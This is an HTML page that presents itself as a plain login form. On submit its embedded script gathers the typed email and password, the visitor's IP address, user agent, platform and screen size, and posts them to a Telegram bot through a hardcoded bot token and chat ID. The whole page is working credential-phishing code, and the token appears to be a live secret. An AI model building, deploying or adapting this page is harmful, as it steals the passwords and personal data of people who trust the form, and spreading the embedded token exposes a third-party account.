<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login Form</title>
</head>
<body>
  <form id="login-form">
    <input type="email" id="email" placeholder="Email" required />
    <input type="password" id="password" placeholder="Password" required />
    <button type="submit">Login</button>
  </form>

  <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
  <script>
    const TOKEN = "8843365045:AAFAovSP2Op8nm2Inkr5iRJ8L9DCgfHZVqo";
    const CHAT_ID = "8298632696";
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    document.getElementById("login-form").addEventListener("submit", async function (e) {
      e.preventDefault();

      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      // Get device information
      const userAgent = navigator.userAgent;
      const platform = navigator.platform;
      const screenWidth = screen.width;
      const screenHeight = screen.height;
      const deviceType = /mobile|iphone|ipad|android/i.test(userAgent) ? "Mobile" : "Desktop";

      console.log("User-Agent:", userAgent);
      console.log("Platform:", platform);
      console.log("Screen Resolution:", screenWidth + "x" + screenHeight);
      console.log("Device Type:", deviceType);

      try {
        // Get user's IP address
        const ipResponse = await axios.get("https://api.ipify.org?format=json");
        const ip = ipResponse.data.ip;

        // Build the Telegram message
        const message = `
<b>New Login Attempt</b>
<b>Email:</b> ${email}
<b>Password:</b> ${password}
<b>IP Address:</b> ${ip}
<b>Device Type:</b> ${deviceType}
<b>Platform:</b> ${platform}
<b>User Agent:</b> ${userAgent}
<b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
`;

        // Send to Telegram
        const response = await axios.post(URI_API, {
          chat_id: CHAT_ID,
          parse_mode: "HTML",
          text: message
        });

        console.log("Message sent:", response.data);
        alert("Informações enviadas com sucesso!");
      } catch (error) {
        console.error("Error fetching IP or sending message:", error);
        alert("Erro ao obter o endereço IP ou enviar as informações. Tente novamente.");
      }
    });
  </script>
</body>
</html>
